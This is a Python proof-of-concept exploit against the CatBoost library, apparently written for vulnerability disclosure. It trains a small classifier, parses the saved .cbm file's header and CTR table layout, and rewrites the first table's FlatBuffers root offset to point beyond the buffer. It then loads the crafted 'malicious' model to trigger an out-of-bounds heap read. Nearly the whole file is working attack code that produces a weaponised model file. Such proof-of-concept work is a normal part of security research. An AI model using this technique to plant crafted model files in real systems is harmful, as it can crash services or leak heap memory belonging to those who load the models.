"""
PoC: CatBoost CTR Value Table OOB Read
Demonstrates that LoadSolid() does not verify FlatBuffers data,
allowing crafted CTR table data to cause OOB heap reads.
"""
import catboost
import struct
import tempfile
import os
import numpy as np

print(f"CatBoost version: {catboost.__version__}")

# Step 1: Create a valid model with categorical features (generates CTR tables)
from catboost import CatBoostClassifier, Pool

np.random.seed(42)
n_samples = 200
X_num = np.random.rand(n_samples, 2)
X_cat = np.random.randint(0, 5, (n_samples, 1)).astype(str)
X = np.column_stack([X_num, X_cat])
y = np.random.randint(0, 2, n_samples)

pool = Pool(X, y, cat_features=[2])
model = CatBoostClassifier(iterations=10, depth=3, verbose=0, random_seed=42)
model.fit(pool)

valid_path = tempfile.mktemp(suffix='.cbm')
model.save_model(valid_path)
print(f"Valid model saved: {valid_path}")

# Step 2: Read and analyze the model file structure
with open(valid_path, 'rb') as f:
    data = bytearray(f.read())

print(f"Model file size: {len(data)} bytes")

# Parse CBM header
magic = struct.unpack('<I', data[0:4])[0]
print(f"Magic: 0x{magic:08X} (expected: CBM1)")

size_marker = struct.unpack('<I', data[4:8])[0]
if size_marker == 0xFFFFFFFF:
    core_size = struct.unpack('<Q', data[8:16])[0]
    fb_start = 16
    print(f"Core size (64-bit): {core_size}")
else:
    core_size = size_marker
    fb_start = 8
    print(f"Core size (32-bit): {core_size}")

ctr_section_start = fb_start + core_size
print(f"FlatBuffers core: bytes [{fb_start}, {ctr_section_start})")
print(f"CTR section starts at: {ctr_section_start}")

if ctr_section_start >= len(data):
    print("ERROR: No CTR data in model (model has no categorical features?)")
    os.unlink(valid_path)
    exit(1)

remaining = len(data) - ctr_section_start
print(f"CTR section size: {remaining} bytes")

# Parse CTR data structure
pos = ctr_section_start
ctr_count_raw = struct.unpack('<I', data[pos:pos+4])[0]
pos += 4
if ctr_count_raw == 0xFFFFFFFF:
    ctr_count = struct.unpack('<Q', data[pos:pos+8])[0]
    pos += 8
else:
    ctr_count = ctr_count_raw
print(f"CTR table count: {ctr_count}")

if ctr_count == 0:
    print("ERROR: No CTR tables found")
    os.unlink(valid_path)
    exit(1)

# Read first CTR table size
table_size_raw = struct.unpack('<I', data[pos:pos+4])[0]
pos += 4
if table_size_raw == 0xFFFFFFFF:
    table_size = struct.unpack('<Q', data[pos:pos+8])[0]
    pos += 8
else:
    table_size = table_size_raw
print(f"First CTR table size: {table_size} bytes")
table_data_start = pos

# Step 3: Corrupt the FlatBuffers data within the CTR table
# The FlatBuffers root offset is the first 4 bytes of the table data
# We corrupt it to point out of bounds
corrupted_data = bytearray(data)

# Strategy: Corrupt the root table offset to point beyond the buffer
# FlatBuffers GetRoot reads: buf + ReadScalar<uoffset_t>(buf)
# If we set this to a large value, it reads beyond the allocated buffer
original_root = struct.unpack('<I', corrupted_data[table_data_start:table_data_start+4])[0]
print(f"Original FlatBuffers root offset: {original_root}")

# Set root offset to point near the end of table, causing OOB when accessing fields
# This will make GetRoot return a pointer near buffer end, and field access will go OOB
corrupt_offset = table_size + 0x1000  # Points well beyond the buffer
struct.pack_into('<I', corrupted_data, table_data_start, corrupt_offset)
print(f"Corrupted root offset to: {corrupt_offset} (table_size={table_size})")

malicious_path = tempfile.mktemp(suffix='.cbm')
with open(malicious_path, 'wb') as f:
    f.write(corrupted_data)
print(f"Malicious model saved: {malicious_path}")

# Step 4: Load the corrupted model
print("\n--- Loading corrupted model ---")
try:
    bad_model = CatBoostClassifier()
    bad_model.load_model(malicious_path)
    print("WARNING: Model loaded without error — OOB read occurred silently!")
    print("Run with AddressSanitizer (ASan) to confirm heap-buffer-overflow")
except Exception as e:
    error_msg = str(e)
    if "segfault" in error_msg.lower() or "signal" in error_msg.lower():
        print(f"CRASH (segfault): {e}")
        print("CONFIRMED: OOB read caused crash")
    elif "Flatbuffers" in error_msg or "verification" in error_msg:
        print(f"FlatBuffers verification caught it: {e}")
        print("NOTE: This means a Verifier IS present (vulnerability may not exist)")
    else:
        print(f"Error: {e}")
        print("Model loading failed (may be OOB-related crash caught as exception)")

# Cleanup
os.unlink(valid_path)
os.unlink(malicious_path)
print("\nDone.")
